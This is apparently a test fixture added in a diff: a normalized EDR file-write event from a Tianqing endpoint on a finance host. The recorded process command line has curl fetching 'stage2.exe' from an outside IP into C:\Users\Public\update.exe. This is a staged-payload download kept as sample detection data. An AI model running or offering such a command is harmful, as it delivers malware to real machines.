@@ -1,0 +1,124 @@
+{
+  "meta": {
+    "schema_version": "2.0",
+    "tenant_id": "tenant01",
+    "event_id": "evt-2b118500ac07637666115b08a9b2f0e262d5315fe7648bcf26b49af636e289e0",
+    "occur_time": "2026-08-20T10:07:40Z",
+    "ingest_time": "2026-08-20T10:07:41.500Z",
+    "parse_time": "2026-08-20T10:07:42.500Z",
+    "mapping_id": "qax.tianqing.edr_file_op.behavior.v1",
+    "data_source": {
+      "vendor": "qax",
+      "product": "tianqing",
+      "category": "audit",
+      "instance_id": "collector-tianqing-poc-01"
+    },
+    "source_record": {
+      "log_id": "log-tianqing-poc-0010",
+      "record_kind": "activity",
+      "log_type": "edr_file_op",
+      "log_name": "天擎 EDR 文件操作",
+      "log_level": "info"
+    }
+  },
+  "event_kind": "behavior",
+  "behavior": {
+    "layer": "system",
+    "type": "change",
+    "operation": "write",
+    "outcome": "observed",
+    "message": null
+  },
+  "subject": {
+    "ref_id": "host::2868257359929504570",
+    "entity_type": "host",
+    "host": {
+      "id": "2868257359929504570",
+      "name": "DESKTOP-FIN-0457",
+      "ip": "192.0.2.111",
+      "mac": "00:00:5E:00:53:6E"
+    }
+  },
+  "object": {
+    "ref_id": "file::b7f3c9a1d4e65f0287a3b1c6d9e04f75",
+    "entity_type": "file",
+    "file": {
+      "name": "update.exe",
+      "path": "C:\\Users\\Public\\update.exe",
+      "hashes": {
+        "md5": "b7f3c9a1d4e65f0287a3b1c6d9e04f75"
+      }
+    }
+  },
+  "carriers": [
+    {
+      "ref_id": "process::ae64b7b3dd9458ca6bdc6fe97f7d6344",
+      "entity_type": "process",
+      "process": {
+        "name": "curl.exe",
+        "uid": "63fe679e70ab3c96e517da0be9f271d3",
+        "pid": "5041",
+        "path": "C:\\Windows\\System32\\curl.exe",
+        "cmdline": "C:\\Windows\\System32\\curl.exe http://203.0.113.15/stage2.exe -o C:\\Users\\Public\\update.exe",
+        "user": {
+          "name": "DESKTOP-FIN-0457\\finance"
+        },
+        "file": {
+          "original_name": "curl.exe",
+          "internal_name": "curl.exe",
+          "hashes": {
+            "md5": "eac53ddafb5cc9e780a7cc086ce7b2b1",
+            "sha1": "e4e3f6bbad17b41a42687b3d75ade4a10b0870ec"
+          },
+          "signatures": [
+            {
+              "signer": "HaoShuQing"
+            }
+          ]
+        }
+      },
+      "carrier_role": "process"
+    }
+  ],
+  "facets": {},
+  "observation": {
+    "observation_id": "obs-2b118500ac07637666115b08a9b2f0e262d5315fe7648bcf26b49af636e289e0",
+    "observer": {
+      "ref_id": "application::tianqing",
+      "entity_type": "application",
+      "application": {
+        "name": "tianqing",
+        "vendor": "qax"
+      }
+    },
+    "action": "record",
+    "evidence_refs": [
+      "source_record:log-tianqing-poc-0010"
+    ]
+  },
+  "extensions": {
+    "source_private": {},
+    "profiles": {
+      "endpoint_asset": {
+        "subject_ref": {
+          "ref_id": "host::2868257359929504570"
+        },
+        "agent": {
+          "id": "08810457-poc9a3f25c7e1d48026b5fa09c47e1d2e3",
+          "fingerprint_id": "c3f1a0d92e47b615f0a8d3c25e97b1846fa209cde53b7a1d608f94e2cb37d5696",
+          "version": "edr-8.0"
+        },
+        "ownership": {
+          "organization": {
+            "id": "2653788242175804570"
+          },
+          "group": {
+            "id": "7e2b91c4a5d03f08",
+            "name": "财务部终端"
+          }
+        }
+      }
+    },
+    "enrichments": {}
+  }
+}
